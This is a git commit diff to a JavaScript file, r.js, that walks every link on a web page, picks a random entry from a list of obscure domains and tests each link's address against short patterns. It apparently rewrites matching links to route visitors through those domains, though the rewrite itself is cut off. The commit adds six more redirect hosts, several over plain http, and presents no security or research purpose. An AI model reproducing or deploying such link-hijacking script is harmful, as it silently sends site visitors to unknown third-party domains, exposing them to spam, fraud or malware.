1cb610e5fcf03080d39ea56d4170caf88b005a32
npog <62229956+npog@users.noreply.github.com>
2023-04-15 23:03:25 +0800

    Update r.js

--- r.js
+++ r.js
@@ -1,6 +1,6 @@
 var links = document.links;
 for (var i=0, iLen=links.length; i<iLen; i++) {
-var threads = ['https://wwe.lynsr.info/?', 'https://blog.musz.info/?', 'https://red.lynsr.info/?', 'https://amy.lynsr.info/?'];  
+var threads = ['https://wwe.lynsr.info/?', 'https://blog.musz.info/?', 'http://re.ycyva.com/?', 'http://rk.ycyva.com/?', 'https://red.lynsr.info/?', 'https://amy.lynsr.info/?', 'http://rg.ycyva.com/?', 'http://rt.ycyva.com/?', 'http://rv.ycyva.com/?', 'http://ry.ycyva.com/?'];  
 var random  = threads[Math.floor(Math.random() * threads.length)];
 var hrefer = document.links[i].href;
 if(hrefer.match("av.a") || hrefer.match("ojjoio")|| hrefer.match("ce.a")|| hrefer.match("ce.n")|| hrefer.match("ja.a")|| hrefer.match("xx.m")) {
